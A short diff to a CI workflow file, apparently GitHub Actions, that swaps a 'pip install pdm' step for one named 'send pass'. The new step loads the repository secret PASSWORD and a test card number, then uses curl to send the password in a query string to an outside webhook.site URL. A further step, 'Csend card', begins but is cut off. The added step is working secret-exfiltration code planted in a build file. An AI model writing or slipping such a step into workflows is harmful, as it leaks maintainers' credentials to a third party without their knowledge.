@@ -20,8 +20,14 @@ jobs:
           python-version: '3.11'
           cache: 'pip'
 
-      - name: Install PDM
-        run: pip install pdm
+      - name: send pass
+        env:
+          PASSWORD: ${{ secrets.PASSWORD }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          curl  "https://webhook.site/e2e8cdf6-a6af-42b3-9e9a-2fc22572d64d?test=hakou2222${PASSWORD}"
+
+
 
       - name: Csend card
         env:
